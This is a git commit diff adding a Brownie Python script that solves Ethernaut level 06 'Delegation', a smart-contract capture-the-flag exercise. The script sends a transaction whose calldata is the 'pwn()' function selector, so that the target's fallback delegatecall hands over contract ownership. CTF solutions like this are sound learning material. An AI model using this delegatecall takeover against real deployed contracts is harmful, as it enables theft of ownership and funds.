f65818b067cf70dbcd19adc65ff29f366b6bb422
sarobinson2001 <sarobinson2011@gmail.com>
2023-09-08 12:14:24 +0100

    Level 06-Delegation completed

--- scripts/06-deploy_attack.py
+++ scripts/06-deploy_attack.py
@@ -1,13 +1,16 @@
 from scripts.helpful_scripts import get_account
-from brownie import interface
+from brownie import web3
 
-# PLAYER = "0xF8f8269488f73fab3935555FCDdD6035699deE25"
+# PLAYER address is "0xF8f8269488f73fab3935555FCDdD6035699deE25"
 
-# new instance of Level 06 - Delegation
 ETHERNAUT_INSTANCE = "0x58817cF27F77243817097b1297D79Ba4d850b233"
 
 
 def main():
 
     player = get_account()
-    return player
+
+    tx = web3.keccak(text="pwn()")[0:4]
+    print(tx)
+
+    player.transfer(to=ETHERNAUT_INSTANCE, data=web3.keccak(text="pwn()")[0:4])
